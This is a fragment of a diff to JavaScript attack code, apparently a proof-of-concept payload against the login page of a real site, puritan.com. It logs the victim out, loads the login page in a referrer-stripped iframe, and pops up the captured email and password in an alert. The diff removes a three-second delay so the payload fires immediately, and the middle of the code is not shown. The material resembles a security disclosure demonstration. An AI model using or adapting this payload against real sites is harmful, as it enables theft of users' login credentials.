@@ -4,7 +4,7 @@ fetch("/login/logout", {
   referrer: "",
   redirect:"manual"
 });
-window.setTimeout(()=>{
+
 let iframe=document.createElement("iframe");
 iframe.src="https://www.puritan.com/login"
   iframe.referrerPolicy="no-referrer"
@@ -20,4 +20,4 @@ alert(`${email} : ${pass}`)
 }
 
 })
-},3000)
+
